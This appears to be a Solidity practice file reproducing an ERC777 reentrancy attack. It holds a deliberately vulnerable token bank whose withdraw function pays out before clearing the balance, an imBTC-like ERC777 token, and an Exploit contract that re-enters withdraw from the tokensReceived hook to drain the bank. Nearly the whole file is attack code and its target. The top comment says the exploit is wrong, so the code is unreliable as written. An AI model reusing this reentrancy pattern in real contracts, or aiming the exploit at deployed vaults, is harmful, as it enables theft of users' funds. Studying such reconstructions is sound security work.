// Note: this exp is wrong

pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";

contract IBTCBank {
    IERC20 token;
    mapping(address => uint256) public balances;

    constructor(address tokenAddr) {
        token = IERC20(tokenAddr);
    }

    function deposit(uint256 amount) external {
        balances[msg.sender] += amount;
        token.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender]; 
        token.transfer(msg.sender, amount);
        balances[msg.sender] = 0;
    }
}


contract IIMBTC is ERC777 {
    constructor(address deployer, uint256 amount) ERC777("imBTC", "imBTC", new address[](0)) {
        _mint(deployer, amount, "", "");
    }

    function decimals() public pure override returns (uint8) {
        return 8;
    }
}


contract Exploit is IERC777Recipient {
    IBTCBank btcBank;
    IIMBTC imBTC;
    uint256 num = 0;
    IERC1820Registry constant registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address btcBankAddress, address imBTCAddress) {
        btcBank = IBTCBank(btcBankAddress);
        imBTC = IIMBTC(imBTCAddress);
        registry.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
    }

    function attack() external {
        imBTC.approve(address(btcBank), type(uint256).max);
        btcBank.deposit(10000e8);
        btcBank.withdraw();
    }
    
    function tokensReceived(
        address operator, 
        address from, 
        address to, 
        uint256 amount, 
        bytes calldata userData, 
        bytes calldata operatorData
    ) external {
        while (num < 19) {
            num++;
            btcBank.withdraw();
        }
    }
}